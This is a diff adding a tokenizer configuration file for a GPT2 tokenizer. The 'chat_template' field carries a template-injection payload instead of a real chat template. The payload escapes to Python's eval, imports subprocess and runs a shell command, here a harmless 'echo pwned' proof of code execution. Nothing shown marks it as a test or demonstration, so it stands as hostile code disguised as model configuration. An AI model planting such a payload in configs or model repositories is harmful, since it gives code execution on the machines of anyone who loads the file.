@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "GPT2Tokenizer",
+  "chat_template": "{{ __builtins__['eval']('__import__(\"subprocess\").call([\"echo\", \"pwned\"])') }}",
+  "model_max_length": 1024
+}
